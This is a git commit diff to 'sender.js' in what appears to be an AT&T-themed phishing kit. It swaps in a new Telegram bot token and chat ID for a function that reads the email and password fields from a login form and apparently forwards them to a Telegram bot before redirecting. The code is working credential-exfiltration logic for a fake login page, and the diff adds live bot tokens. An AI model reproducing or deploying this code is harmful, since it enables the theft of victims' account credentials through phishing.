b77114fa0531aad902286fb876210d48ba971831
attnew <wallerjames178@gmail.com>
2024-07-16 14:49:33 -0700

    Update sender.js

--- AT&T script final-update/AT&T script/sender.js
+++ AT&T script final-update/AT&T script/sender.js
@@ -5,8 +5,8 @@ function sendTelegramMessageAndRedirect() {
   //   const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
   //   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string
 
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // add the telegram token
-  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
+  const telegramBotToken = "6567283982:AAEnrAsI1zzaLrGFULyuw-FArp4XMwJbNak"; // add the telegram token
+  const chatId = 6629907685; // add ths id from the web It's usually a number, not a string
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
 
